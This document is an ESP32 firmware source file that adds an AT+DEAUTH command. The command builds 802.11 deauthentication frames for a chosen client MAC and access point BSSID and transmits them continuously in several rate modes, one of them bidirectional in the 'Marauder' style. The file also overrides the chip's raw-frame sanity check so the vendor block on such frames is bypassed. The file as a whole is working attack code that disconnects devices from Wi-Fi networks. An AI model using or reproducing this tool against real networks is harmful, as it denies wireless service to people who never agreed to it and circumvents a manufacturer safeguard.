#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include "esp_at.h"
#include "esp_log.h"
#include "at_util.h"


#define DEAUTH_WIFI_MODE 2
#define NUM_ENABLE_MODES 9
#define USE_FRAME_MODE_SIGNATURE true

static const char *TAG = "deauth";

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);


static uint8_t deauth_frame_default[26] = {
                            0xc0, 0x00,                             // 0xc000 = Deauthentication frame
                            0x3a, 0x01,                             // 0x3a01 = Duration (314 microseconds)
                            0xff, 0xff, 0xff, 0xff, 0xff, 0xff,     // Dest MAC
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // Src MAC (same as BSSID for deauth)
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // BSSID
                            0xf0, 0xff,                             // 0x0fff = sequence number (0xfff = 4096), fragment number (0)
                            0x02, 0x00                              // 0x0002 = Reason code: Previous authentication no longer valid
                        };

static uint8_t deauth_frame_src[26] = {0};
static uint8_t deauth_frame_dest[26] = {0};

static int                  s_frames_sent = 0;
static TaskHandle_t         s_deauth_task = NULL;
static bool                 s_deauth_active = false;
static uint8_t              s_channel = 0;
static uint16_t             s_enable_mode = 0;


/**
 * @brief Decompiled function that overrides the original one at link time.
 *
 * @attention This function is not meant to be called directly!
 * The corresponding strong symbol in libnet80211.a is weakened by the CI build step
 * (objcopy --weaken-symbol) so that this definition takes precedence at link time.
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
extern int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) return 1;
    else return 0;
}

static void deauth_task(void *arg)
{
    int i = 0;

    // Update NUM_ENABLE_MODES if new modes are added/removed
    while (s_deauth_active) {
        switch (s_enable_mode)
		{
        // frame loop @ 46 frames a second (actual 18 to 20 frames/sec)
        case 2:
            for (i = 0; i < 3; i++) {
                esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
                vTaskDelay(5);
                s_frames_sent = s_frames_sent + 1;
            }
            vTaskDelay(50);
            break;


        // frame loop @ 26 frames a second (actual 18 to 20 frames/sec)
        case 3:
            for (i = 0; i < 3; i++) {
                esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
                vTaskDelay(5);
                s_frames_sent = s_frames_sent + 1;
            }
            vTaskDelay(100);
            break;

        // frame loop @ 11 frames a second
        case 4:
            for (i = 0; i < 3; i++) {
                esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
                vTaskDelay(5);
                s_frames_sent = s_frames_sent + 1;
            }
            vTaskDelay(250);
            break;

        // single frame @ 50 frames a second (actual 18 to 20 frames/sec)
		case 5:
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
            s_frames_sent = s_frames_sent + 1;
            vTaskDelay(50);
            break;

        // single frame @ 10 frames a second
		case 6:
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
            s_frames_sent = s_frames_sent + 1;
            vTaskDelay(100);
            break;

        // single frame @ 4 frames a second
		case 7:
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
            s_frames_sent = s_frames_sent + 1;
            vTaskDelay(250);
            break;

        // single frame @ 2 frames a second
		case 8:
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
            s_frames_sent = s_frames_sent + 1;
            vTaskDelay(500);
            break;

        // ESP32 Marauder style
		case 9:
            for (i = 0; i < 3; i++) {
                esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
                vTaskDelay(5);
                esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_dest, sizeof(deauth_frame_dest), false);
                vTaskDelay(5);
                s_frames_sent = s_frames_sent + 2;
            }
            vTaskDelay(50);
            break;

        // Default loop mode @ 18 deauth frames a second
        case 1:
		default:
            for (i = 0; i < 3; i++) {
                esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
                vTaskDelay(5);
                s_frames_sent = s_frames_sent + 1;
            }
            vTaskDelay(150);
            break;

        }
    }

    static uint8_t buffer[64] = {0};
    snprintf((char *)buffer, 64, "+DEAUTH:(%d)\r\n", s_frames_sent);
    esp_at_port_write_data(buffer, strlen((char *)buffer));

    ESP_LOGI(TAG, "deauth_task stopping, sent %d frames", s_frames_sent);
    vTaskDelete(NULL);
}

static void construct_deauth_frames(uint8_t *mac, uint8_t *bssid) {
    // Build AP source packet
    memcpy(deauth_frame_src, deauth_frame_default, sizeof(deauth_frame_default));
    deauth_frame_src[4] = mac[0];
    deauth_frame_src[5] = mac[1];
    deauth_frame_src[6] = mac[2];
    deauth_frame_src[7] = mac[3];
    deauth_frame_src[8] = mac[4];
    deauth_frame_src[9] = mac[5];

    deauth_frame_src[10] = bssid[0];
    deauth_frame_src[11] = bssid[1];
    deauth_frame_src[12] = bssid[2];
    deauth_frame_src[13] = bssid[3];
    deauth_frame_src[14] = bssid[4];
    deauth_frame_src[15] = bssid[5];

    deauth_frame_src[16] = bssid[0];
    deauth_frame_src[17] = bssid[1];
    deauth_frame_src[18] = bssid[2];
    deauth_frame_src[19] = bssid[3];
    deauth_frame_src[20] = bssid[4];
    deauth_frame_src[21] = bssid[5];

    // Build AP dest packet (ESP32 Marauder)
    memcpy(deauth_frame_dest, deauth_frame_default, sizeof(deauth_frame_default));
    deauth_frame_dest[4] = bssid[0];
    deauth_frame_dest[5] = bssid[1];
    deauth_frame_dest[6] = bssid[2];
    deauth_frame_dest[7] = bssid[3];
    deauth_frame_dest[8] = bssid[4];
    deauth_frame_dest[9] = bssid[5];

    deauth_frame_dest[10] = mac[0];
    deauth_frame_dest[11] = mac[1];
    deauth_frame_dest[12] = mac[2];
    deauth_frame_dest[13] = mac[3];
    deauth_frame_dest[14] = mac[4];
    deauth_frame_dest[15] = mac[5];

    deauth_frame_dest[16] = mac[0];
    deauth_frame_dest[17] = mac[1];
    deauth_frame_dest[18] = mac[2];
    deauth_frame_dest[19] = mac[3];
    deauth_frame_dest[20] = mac[4];
    deauth_frame_dest[21] = mac[5];

    if (USE_FRAME_MODE_SIGNATURE) {
        // Apply mode signature to frame. Overwrite least significant bits in sequence number
        deauth_frame_src[22] = s_enable_mode << 4;
        deauth_frame_dest[22] = s_enable_mode << 4;

        ESP_LOGI(TAG, "applying sequence signature for mode %u = 0x%x", s_enable_mode, deauth_frame_src[22]);
    }
}

/* AT+DEAUTH? — query status */
static uint8_t at_query_cmd_deauth(uint8_t *cmd_name)
{
    static uint8_t buffer[64] = {0};
    snprintf((char *)buffer, 64, "+DEAUTH:(%d,%u,%u,%u)\r\n", s_deauth_active ? 1 : 0, s_channel, s_enable_mode, NUM_ENABLE_MODES);
    esp_at_port_write_data(buffer, strlen((char *)buffer));

    return ESP_AT_RESULT_CODE_OK;
}

/* AT+DEAUTH=<enable>[,<channel>,<mac>,<bssid>]  */
static uint8_t at_setup_cmd_deauth(uint8_t para_num)
{
    int32_t enable = 0;
    if (esp_at_get_para_as_digit(0, &enable) != ESP_AT_PARA_PARSE_RESULT_OK) {
        return ESP_AT_RESULT_CODE_ERROR;
    }

    s_enable_mode = (uint16_t)enable;
    if (s_enable_mode > NUM_ENABLE_MODES) {
        s_enable_mode = 1;
        ESP_LOGW(TAG, "invalid enable mode, defaulting to mode 1");
    }

    if (s_enable_mode == 0) {
        /* === STOP deauth === */
        if (!s_deauth_active) {
            return ESP_AT_RESULT_CODE_OK;  /* already stopped */
        }
        s_deauth_active = false;

        /* Wait for output task to exit */
        if (s_deauth_task) {
            vTaskDelay(pdMS_TO_TICKS(400));
            s_deauth_task = NULL;
        }

        s_channel = 0;

        ESP_LOGI(TAG, "deauth stopped");
        return ESP_AT_RESULT_CODE_OK;
    } else {
        if (para_num != 4) {
            ESP_LOGE(TAG, "invalid parameter length, got %d parameters, wanted 1 or 4", para_num);
            return ESP_AT_RESULT_CODE_ERROR;
        }

        int32_t channel = 0;
        if (esp_at_get_para_as_digit(1, &channel) != ESP_AT_PARA_PARSE_RESULT_OK) {
            return ESP_AT_RESULT_CODE_ERROR;
        }

        // read target MAC and BSSID then convert to bytes
        uint8_t *p_mac = NULL;
        if (esp_at_get_para_as_str(2, &p_mac) != ESP_AT_PARA_PARSE_RESULT_OK) {
            return ESP_AT_RESULT_CODE_ERROR;
        }

        uint8_t *p_bssid = NULL;
        if (esp_at_get_para_as_str(3, &p_bssid) != ESP_AT_PARA_PARSE_RESULT_OK) {
            return ESP_AT_RESULT_CODE_ERROR;
        }

        uint8_t bssid[6] = {0};
        uint8_t mac[6] = {0};
        copy_mac_cstr_to_byte(mac, (char*)p_mac);
        copy_mac_cstr_to_byte(bssid, (char*)p_bssid);


        if (s_deauth_active) {
            ESP_LOGI(TAG, "deauth already started, updating deauth frames");

            s_channel = channel;
            esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
            construct_deauth_frames(mac, bssid);
            return ESP_AT_RESULT_CODE_OK;
        }

        //esp_wifi_set_storage(WIFI_STORAGE_RAM);
        esp_wifi_start();
        vTaskDelay(pdMS_TO_TICKS(50));

        s_channel = channel;
        esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_mode(DEAUTH_WIFI_MODE);

        s_deauth_active = true;
        s_frames_sent = 0;
        construct_deauth_frames(mac, bssid);
        xTaskCreate(deauth_task, "deauth", 4096, NULL, 5, &s_deauth_task);

        ESP_LOGI(TAG, "deauth started, channel: %d", s_channel);
    }

    return ESP_AT_RESULT_CODE_OK;
}

static const esp_at_cmd_struct s_deauth_cmd_list[] = {
    {"+DEAUTH", NULL, at_query_cmd_deauth, at_setup_cmd_deauth, NULL},
};

bool esp_at_custom_deauth_cmd_register(void)
{
    ESP_LOGI(TAG, "esp_at_custom_deauth_register");
    return esp_at_custom_cmd_array_regist(s_deauth_cmd_list, sizeof(s_deauth_cmd_list) / sizeof(s_deauth_cmd_list[0]));
}
